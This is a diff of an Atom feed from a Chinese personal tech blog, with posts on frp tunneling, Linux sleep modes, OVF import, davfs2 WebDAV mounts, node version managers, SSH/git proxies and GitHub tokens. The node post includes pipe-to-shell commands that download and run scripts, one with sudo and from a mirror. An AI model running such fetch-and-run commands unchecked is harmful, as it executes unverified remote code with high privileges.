+    <content type="html"><![CDATA[<h2 id="frp-介绍">frp 介绍</h2><p>frp 是一个专注于内网穿透的反向代理工具，支持 TCP、UDP、HTTP、HTTPS等多种协议。可以将内网服务通过具有公网 IP 节点的中转暴露到公网。</p><p>软件安装以及自建服务端可以去<ahref="https://gofrp.org/docs/">官方文档</a>查看</p><h2 id="免费平台推荐">免费平台推荐</h2><ol type="1"><li><a href="https://www.natfrp.com/">SakuraFrp</a>（体验好，有国内节点，需要注册账号，建立 http通道绑定的域名需要备案）</li><li><a href="https://freefrp.net/docs">免费 FRP内网穿透</a>（体验略逊于上面，但无需注册，建立 http通道需要自己的域名，无需备案）</li></ol><h2 id="配置示例">配置示例</h2><h3 id="通过-ssh-访问内网机器">通过 SSH 访问内网机器</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = frp.freefrp.net<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = freefrp.net<br><br><span class="hljs-section">[ssh_484939d2_tcp]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-comment"># 自己机器的ip，本机部署就是127.0.0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">22</span> <span class="hljs-comment"># 本地提供服务的ip地址</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">39317</span> <span class="hljs-comment"># 映射到公网的哪个端口，（启动后如果无法访问就换个端口</span><br></code></pre></td></tr></table></figure><p>然后可以使用 <code>ssh ssh://root@frp.freefrp.net:39317</code>连接到内网设备</p><h3 id="通过自定义域名访问内网的-web-服务">通过自定义域名访问内网的 Web服务</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = frp.freefrp.net<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = freefrp.net<br><br><span class="hljs-section">[test_your_domain_http]</span><br><span class="hljs-attr">type</span> = http<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8080</span><br><span class="hljs-attr">custom_domains</span> = test.your.domain<br><span class="hljs-attr">subdomain</span> = test<br></code></pre></td></tr></table></figure><p>然后可以使用 <code>http://test.your.domain</code>访问你内网部署的网站</p><p>更多示例详见：<a href="https://gofrp.org/docs/examples/">示例 |frp</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;frp-介绍&quot;&gt;frp 介绍&lt;/h2&gt;
+&lt;p&gt;frp 是一个专注于内网穿透的反向代理工具，支持 TCP、UDP、HTTP、HTTPS
+等多种协议。可以将内网服务通过具有公网 IP 节点的中转暴露到公网。&lt;/p&gt;
+&lt;p&gt;软件安装以及自建服务端可以去&lt;a
+href=&quot;</summary>
+      
+    
+    
+    
+    
+    <category term="frp" scheme="https://blog.oopsky.top/tags/frp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux 上几种睡眠模式比较</title>
+    <link href="https://blog.oopsky.top/post/af1f09e9/"/>
+    <id>https://blog.oopsky.top/post/af1f09e9/</id>
+    <published>2022-12-10T03:46:29.000Z</published>
+    <updated>2022-12-10T03:46:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">suspend</span>                    <span class="hljs-comment"># Suspend the system</span><br>systemctl hibernate                  <span class="hljs-comment"># Hibernate the system</span><br>systemctl hybrid-sleep               <span class="hljs-comment"># Hibernate and suspend the system</span><br>systemctl suspend-then-hibernate     <span class="hljs-comment"># Suspend the system, wake after a period of time, and hibernate</span><br></code></pre></td></tr></table></figure><h2 id="suspend">suspend</h2><p>普通的挂起（或者说睡眠），机器能以最快的速度被唤醒。不建议在笔记本不插电时使用，容易睡死(电池耗尽后丢失工作状态)。</p><h2 id="hibernate">hibernate</h2><p>普通的休眠，约等于完全关机，但会保留上次的内存状态到硬盘内，唤醒后再恢复。速度稍慢，好处是不用担心睡死（毕竟已经“完全关机”了:joy_cat:）。</p><h2 id="suspend-then-hibernate">suspend-then-hibernate</h2><p>先挂起，经过一段时间后系统自动唤醒并执行休眠操作。</p><p>但默认的等待时间一般都比较长，（文档里说是120min，<code>/etc/systemd/sleep.conf</code> 里的默认配置写的是180min），电池不给力的话，仍有睡死的风险，如使用此模式建议根据笔记本情况以及自己的需求设定一个较短的时间。</p><h2 id="hybrid-sleep">hybrid-sleep</h2><p>混合睡眠，suspend 的同时也把内存状态备份到硬盘，睡眠速度比 suspend稍慢，唤醒速度大差不差，可以防止睡死。</p><p>我起初以为它的效果只是 suspend的同时也把内存状态备份到硬盘以避免睡死，但在实际使用时发现我的笔记本在suspend时仍会发热（而且发热量很可观，几乎比省电模式下空载还热了，耗电估计也小不了），但hybrid-sleep 时几乎没有发热，我觉得它应该做了更多的处理。不排除 suspend在我的本子上没有正常工作这个可能</p><blockquote><p>我发现我的笔记本在 suspend时仍会发热（而且发热量很可观，几乎比省电模式下空载还热了，耗电估计也小不了），但hybrid-sleep 时几乎没有发热（和在 Windows 11下睡眠的表现差不多）。<br />suspend 是普通的挂起，hybrid-sleep是混合睡眠，从文档里的的介绍来看混合睡眠只是比普通的挂起多了个保存内存状态到硬盘的操作，按理说它俩的功耗表现应该是一样的啊，是hybrid-sleep 在控制功耗方面做了更多的处理，还是 suspend在我的本子上没有正常工作呢？<br /><ahref="https://forum.suse.org.cn/t/topic/15224">https://forum.suse.org.cn/t/topic/15224</a></p></blockquote><h2 id="解决">解决</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/systemd/sleep.conf</span><br>[Sleep]<br><span class="hljs-comment">#AllowSuspend=yes</span><br><span class="hljs-comment">#AllowHibernation=yes</span><br><span class="hljs-comment">#AllowSuspendThenHibernate=yes</span><br><span class="hljs-comment">#AllowHybridSleep=yes</span><br><span class="hljs-comment">#SuspendMode=</span><br><span class="hljs-comment">#SuspendState=mem standby freeze</span><br><span class="hljs-comment">#HibernateMode=platform shutdown</span><br><span class="hljs-comment">#HibernateState=disk</span><br><span class="hljs-comment">#HybridSleepMode=suspend platform shutdown</span><br><span class="hljs-comment">#HybridSleepState=disk</span><br><span class="hljs-comment">#HibernateDelaySec=180min</span><br><br><span class="hljs-comment"># Disable useless items</span><br>AllowHibernation=no<br>AllowSuspendThenHibernate=no<br><span class="hljs-comment"># Configure suspend as hybrid-sleep</span><br>SuspendMode=<span class="hljs-built_in">suspend</span> platform shutdown<br>SuspendState=disk<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OVF 导入报错</title>
+    <link href="https://blog.oopsky.top/post/c9eac9bf/"/>
+    <id>https://blog.oopsky.top/post/c9eac9bf/</id>
+    <published>2022-08-07T03:58:00.000Z</published>
+    <updated>2022-08-07T03:58:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在 VirtualBox 内导入由 VMware 生成的 OVF文件时提示如下错误，无法导入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Error reading <span class="hljs-string">&quot;D:\Downloads\xxxx\xxxx.ovf&quot;</span>: Host resource of <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;Other Storage Device (20)&quot;</span> is supported with SATA AHCI controllers only, line 47 (subtype:vmware.nvme.controller).<br></code></pre></td></tr></table></figure><p>通过该报错我们可以得知，VirtualBox 仅支持 <code>AHCI</code>控制器,无法识别 <code>vmware.nvme.controller</code></p><p>那么只需要将 <code>vmware.nvme.controller</code> 改为<code>AHCI</code>就可以导入了，在导入时别忘调整名称、操作系统类型等设置</p><p><em>另外，所谓的 OVF 其实就是一个虚拟硬盘文件加上一个描述虚拟机配置的ovf文件的集合，所以即使无法成功导入也问题不大，我们直接新建虚拟机，在创建虚拟磁盘时不创建新的，直接导入OVF 的那个虚拟磁盘文件就行了</em></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;在 VirtualBox 内导入由 VMware 生成的 OVF
+文件时提示如下错误，无法导入：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;</summary>
+      
+    
+    
+    
+    
+    <category term="virtualbox" scheme="https://blog.oopsky.top/tags/virtualbox/"/>
+    
+    <category term="vmware" scheme="https://blog.oopsky.top/tags/vmware/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 davfs2 挂载 webdav</title>
+    <link href="https://blog.oopsky.top/post/624431f7/"/>
+    <id>https://blog.oopsky.top/post/624431f7/</id>
+    <published>2022-08-06T04:00:00.000Z</published>
+    <updated>2022-12-19T04:40:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先安装好 davfs2 软件包</p><h2 id="配置-davfs2">配置 davfs2</h2><ul><li>编辑 /etc/davfs2/davfs2.conf 取消以下项的注释并更改值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ignore_dav_header 1<br>use_locks 0<br></code></pre></td></tr></table></figure><ul><li>配置用户名/密码</li></ul><p>编辑 /etc/davfs2/secrets 末尾添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://seto.teracloud.jp/dav/ &lt;username&gt; &lt;secret&gt;<br><span class="hljs-comment"># 也可以有子目录</span><br>https://seto.teracloud.jp/dav/dir1/ &lt;username&gt; &lt;secret&gt;<br>https://seto.teracloud.jp/dav/dir2/ &lt;username&gt; &lt;secret&gt;<br></code></pre></td></tr></table></figure><h2 id="手动挂载">手动挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建挂载路径</span><br><span class="hljs-built_in">mkdir</span> /webdav<br><span class="hljs-comment">#手动挂载</span><br>mount -t davfs https://seto.teracloud.jp/dav/dir1/ /webdav/dir1/<br><span class="hljs-comment"># 卸载</span><br>umount /webdav/dir1/<br></code></pre></td></tr></table></figure><p>手动挂载测试过没问题后可以配置开机自动挂载</p><h2 id="自动挂载">自动挂载</h2><p>编辑 /etc/fstab 末尾添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://seto.teracloud.jp/dav/dir1/ /path/to/dir1/ davfs rw,user,<span class="hljs-built_in">sync</span>,noauto,uid=1000,_netdev 0 0<br></code></pre></td></tr></table></figure><p>编辑 <code>etc/systemd/system/mount-webdav.service</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Unit]<br><span class="hljs-comment"># 服务名称，可自定义Description=Mount WebDAV Service (KeePass)</span><br>After = network.target syslog.target<br>Wants = network.target<br><br>[Service]<br>Type = oneshot<br>ExecStart = bash -c <span class="hljs-string">&#x27;for i in &#123;1..15&#125;; do if ping -c 1 seto.teracloud.jp; then mount /path/to/dir1/; break; else sleep 1; fi; done&#x27;</span><br>ExecStop = umount /path/to/dir1/<br>RemainAfterExit = <span class="hljs-literal">true</span><br><br>[Install]<br>WantedBy = multi-user.target<br></code></pre></td></tr></table></figure><p>然后执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> --now keepass-webdav.service<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先安装好 davfs2 软件包&lt;/p&gt;
+&lt;h2 id=&quot;配置-davfs2&quot;&gt;配置 davfs2&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;编辑 /etc/davfs2/davfs2.conf 取消以下项的注释并更改值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlig</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="webdav" scheme="https://blog.oopsky.top/tags/webdav/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 nvm 快速安装和使用不同版本的 node</title>
+    <link href="https://blog.oopsky.top/post/77399d91/"/>
+    <id>https://blog.oopsky.top/post/77399d91/</id>
+    <published>2022-04-22T04:46:00.000Z</published>
+    <updated>2023-02-06T06:00:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>2023 年 2 月 6 日更新：</p></blockquote><p>总感觉 nvm 载入有点慢，目前切换到了 <ahref="https://github.com/tj/n">n</a>,使用方式：</p><p>直接执行下面命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> bash &lt;(curl -L https://raw.gitmirror.com/tj/n/master/bin/n) lts<br></code></pre></td></tr></table></figure><p>默认情况下会把程序下载到 <code>/usr/local/n/</code>，所以需要<code>sudo</code>，如果想安装到其他位置，需要先处理一下环境变量才能正常工作，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> N_PREFIX=<span class="hljs-variable">$HOME</span>/.n<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.n/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br></code></pre></td></tr></table></figure><hr /><blockquote><p>下面是之前的内容</p></blockquote><p>nvm 的全名是 <a href="https://github.com/nvm-sh/nvm">Node VersionManager</a>，是一个 node.js的版本管理器，可以帮助用户通过命令行快速安装和使用不同版本的 node。nvm可以在任何兼容 POSIX 的shell（sh、dash、ksh、zsh、bash）上工作，尤其是在 unix、macOS 和 windowsWSL。</p><h2 id="安装">安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o- https://cdn.jsdelivr.net/gh/nvm-sh/nvm/install.sh | bash<br></code></pre></td></tr></table></figure><p>请在安装后执行一下 <code>nvm</code>检查是否成功，该安装脚本会尝试自动处理<code>~/.bashrc</code>，如果没有找到 <code>nvm</code> 命令，可以手动在shell 的用户配置文件添加如下内容（<code>zsh</code> 对应的是<code>~/.zshrc</code>，其他 shell 请自行查询用户配置位置）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.nvm&quot;</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="hljs-comment"># This loads nvm</span><br></code></pre></td></tr></table></figure><h2 id="首次使用">首次使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm install --lts <span class="hljs-comment"># 下载最新的LTS版本</span><br></code></pre></td></tr></table></figure><p>然后检查一下配置是否生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">which</span> npm<br>/home/idea/.nvm/versions/node/v16.14.2/bin/npm<br>$ <span class="hljs-built_in">which</span> node<br>/home/idea/.nvm/versions/node/v16.14.2/bin/node<br></code></pre></td></tr></table></figure><h2 id="更改-npmmirror-中国镜像站">更改 npmmirror 中国镜像站</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> registry https://registry.npmmirror.com<br></code></pre></td></tr></table></figure><p>更多使用姿势请自行搜索</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;2023 年 2 月 6 日更新：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;总感觉 nvm 载入有点慢，目前切换到了 &lt;a
+href=&quot;https://github.com/tj/n&quot;&gt;n&lt;/a&gt;,使用方式：&lt;/p&gt;
+&lt;p&gt;直接执行下面命令即可&lt;</summary>
+      
+    
+    
+    
+    
+    <category term="node" scheme="https://blog.oopsky.top/tags/node/"/>
+    
+    <category term="npm" scheme="https://blog.oopsky.top/tags/npm/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>通过代理访问 Github 仓库</title>
+    <link href="https://blog.oopsky.top/post/6cedfc7a/"/>
+    <id>https://blog.oopsky.top/post/6cedfc7a/</id>
+    <published>2022-03-29T06:10:00.000Z</published>
+    <updated>2023-01-17T02:02:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>众所周知，GitHub在国内常常因为不可抗力导致访问受限，在此我分享一下我用来提升 GitHub使用体验的几个姿势</p><h2 id="http">HTTP</h2><p>在使用 Git 操作远程仓库时，如果用的是 HTTP协议，可以直接用下面这样的命令配置（所有支持 Git的平台都可以这么配置）</p><blockquote><p><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[Differentiate socks5h from socks5...](https://github.com/urllib3/urllib3/issues/1035)">[1]</span></a></sup>在代理字符串中，socks5h://表示主机名由SOCKS 服务器解析。socks5://表示主机名在本地解析。为避免可能存在的 DNS污染问题，一般建议使用 socks5h</p></blockquote><p>我们可以对所有域名都启用代理（全局）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global http.proxy socks5h://127.0.0.1:7890<br></code></pre></td></tr></table></figure><p>也可以分别对某些域名启用代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global http.https://github.com.proxy socks5h://127.0.0.1:7890<br><br>git config --global http.https://gitlab.com.proxy socks5h://127.0.0.1:7890<br><br><span class="hljs-comment"># 未在上面配置的域名将不会通过代理</span><br></code></pre></td></tr></table></figure><p><sub>别忘把命令末尾的代理服务器地址改成你自己的</sub></p><blockquote><p>从 2021 年 8 月 13 日开始，GitHub 将在对 Git操作进行身份验证时不再接受帐户密码，并将要求使用基于令牌（token）的身份验证，<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[使用令牌访问 GitHub](https://blog.oopsky.top/post/545a5fc3/)">[2]</span></a></sup>例如个人访问令牌。或者选择使用SSH 密钥。</p></blockquote><p>也就是说，现在不支持直接使用 https 链接访问私有库了，在不使用 token的情况下，我们将只能对 GitHub 上的公共仓库进行 clone操作，当然我们可以选择使用 SSH 。</p><h2 id="ssh">SSH</h2><p>若想要让 SSH 协议也通过代理，只需在 <code>~/.ssh/config</code>添加如下内容:</p><h3 id="linux-macos">Linux / macOS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs config">Host github.com<br>    ProxyCommand nc -x 127.0.0.1:7890 %h %p<br></code></pre></td></tr></table></figure><h3 id="windows">Windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs config">Host github.com<br>    ProxyCommand &quot;C:\Program Files\Git\mingw64\bin\connect.exe&quot; -S 127.0.0.1:7890 %h %p<br></code></pre></td></tr></table></figure><h3 id="拓展在-443-端口使用-ssh-仅限-github3">拓展，在 443 端口使用 SSH(仅限Github<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[在 HTTPS 端口使用 SSH](https://docs.github.com/cn/authentication/troubleshooting-ssh/using-ssh-over-the-https-port)">[3]</span></a></sup>)</h3><p>有时，防火墙会阻断内网客户端对 22 端口的连接，有些机场也会阻断 22端口，这时可以尝试使用通过 443 端口建立的 SSH 连接</p><p>编辑文件 <code>~/.ssh/config</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs config">Host github.com<br>    Hostname ssh.github.com<br>    Port 443<br>    User git<br>    ProxyCommand nc -x 127.0.0.1:7890 %h %p<br></code></pre></td></tr></table></figure><p>然后可以直接使用形似 <code>git@github.com:user/repo.git</code>的克隆链接</p><p><!-- ~~如果不想改配置，也可以直接使用形似`ssh://git@ssh.github.com:443/user/repo.git`的克隆链接，两种方式是等价的~~ 更正：也需要在`Host`字段添加`ssh.github.com`才能无痛使用。。。总之可以忽略删除线到现在的内容 😂 --></p><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><ahref="https://github.com/urllib3/urllib3/issues/1035">Differentiatesocks5h from socks5...</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://blog.oopsky.top/post/545a5fc3/">使用令牌访问GitHub</a> <a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><ahref="https://docs.github.com/cn/authentication/troubleshooting-ssh/using-ssh-over-the-https-port">在HTTPS 端口使用 SSH</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;众所周知，GitHub
+在国内常常因为不可抗力导致访问受限，在此我分享一下我用来提升 GitHub
+使用体验的几个姿势&lt;/p&gt;
+&lt;h2 id=&quot;http&quot;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;在使用 Git 操作远程仓库时，如果用的是 HTTP
+协议，可以直接用下面这样的命令配置（所</summary>
+      
+    
+    
+    
+    
+    <category term="git" scheme="https://blog.oopsky.top/tags/git/"/>
+    
+    <category term="ssh" scheme="https://blog.oopsky.top/tags/ssh/"/>
+    
+    <category term="proxy" scheme="https://blog.oopsky.top/tags/proxy/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>给 SSH 设置代理</title>
+    <link href="https://blog.oopsky.top/post/537127c9/"/>
+    <id>https://blog.oopsky.top/post/537127c9/</id>
+    <published>2022-03-05T11:42:00.000Z</published>
+    <updated>2022-12-20T12:50:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>学校的校园网不知出于何种考虑封禁了 22端口，这给我带来了一些麻烦，我无法使用 ssh 链接克隆我的 Git仓库了，而且有些云服务器的 sshd 如果用的是默认的 22端口，也将无法建立通信，还有些代码托管平台由于不可抗力也会无法访问。这种情况下就要用到代理了</p><h2 id="linux-macos">Linux / macOS</h2><p>只需要在 <code>~/.ssh/config</code> 添加如下内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs config">Host &lt;要访问的主机&gt;<br>    ProxyCommand nc -x 127.0.0.1:7890 %h %p<br></code></pre></td></tr></table></figure><p><strong>参数解释</strong></p><p><code>Host</code> 后面跟需要要代理的主机名（或 ip地址），多个主机用空格隔开，如果填写 <code>*</code>则表示该配置作用于所有主机。</p><p>使用 <code>-X proxy_protocol</code>指定代理服务器使用的协议。<code>4</code> 代表 socks4,<code>5</code> 代表socks5，<code>connect</code> 代表 http，如果未使用 <code>-X</code>参数，则默认使用 socks5 协议</p><p>使用 <code>-x proxy_address[:port]</code> 指定代理服务器和端口</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs config">Host github.com gitlab.com 111.111.111.111<br>    ProxyCommand nc -X connect -x 127.0.0.1:7890 %h %p<br></code></pre></td></tr></table></figure><hr /><p>如果只是临时使用代理访问服务器的场景，也可以直接使用命令行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o ProxyCommand=<span class="hljs-string">&quot;nc -x 127.0.0.1:7890 %h %p&quot;</span> user@server<br></code></pre></td></tr></table></figure><h2 id="windows">Windows</h2><p>首先安装 <a href="https://git-scm.com/download/win">Git forWindows</a></p><p>ssh 的配置文件的位置是<code>C:\Users\yourName\.ssh\config</code>，</p><p>和 linux 平台的配置不同的是，我们需要把 ProxyCommand后面的内容改成类似下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs config">Host github.com 111.111.111.111<br>    ProxyCommand &quot;C:\Program Files\Git\mingw64\bin\connect.exe&quot; -S 127.0.0.1:10808 %h %p<br></code></pre></td></tr></table></figure><p><strong>参数解释</strong></p><p><code>-S</code> 代表 socks5，<code>-H</code> 代表 http</p><p>其他都和 Linux 平台没啥区别</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+&lt;p&gt;学校的校园网不知出于何种考虑封禁了 22
+端口，这给我带来了一些麻烦，我无法使用 ssh 链接克隆我的 Git
+仓库了，而且有些云服务器的 sshd 如果用的是默认的 22
+端口，也将无法建立通信，还有些代码托管平台由于不可抗力也会无</summary>
+      
+    
+    
+    
+    
+    <category term="git" scheme="https://blog.oopsky.top/tags/git/"/>
+    
+    <category term="ssh" scheme="https://blog.oopsky.top/tags/ssh/"/>
+    
+    <category term="proxy" scheme="https://blog.oopsky.top/tags/proxy/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用令牌访问 GitHub</title>
+    <link href="https://blog.oopsky.top/post/545a5fc3/"/>
+    <id>https://blog.oopsky.top/post/545a5fc3/</id>
+    <published>2021-08-14T00:24:00.000Z</published>
+    <updated>2021-08-14T00:24:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>从 2021 年 8 月 13 日开始，GitHub 将在对 Git操作进行身份验证时不再接受帐户密码，并将要求使用基于令牌（token）的身份验证，例如个人访问令牌。当然你也可以选择使用SSH 密钥。</p><p>要创建一个令牌，首先需要打开 <ahref="https://github.com/settings/tokens">Personal access tokens</a>，点击 <strong>Generate new token</strong>，接着为此令牌设置备注、过期时间并勾选适当的权限，最后点击<strong>Generate token</strong> 生成令牌。</p><p>然后就可以使用<code>https://&lt;TOKEN&gt;@github.com/&lt;user_name&gt;/&lt;repo_name&gt;.git</code>操作仓库了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;从 2021 年 8 月 13 日开始，GitHub 将在对 Git
+操作进行身份验证时不再接受帐户密码，并将要求使用基于令牌（token）的身份验证，例如个人访问令牌。当然你也可以选择使用
+SSH 密钥。&lt;/p&gt;
+&lt;p&gt;要创建一个令牌，首先需要打开 &lt;a
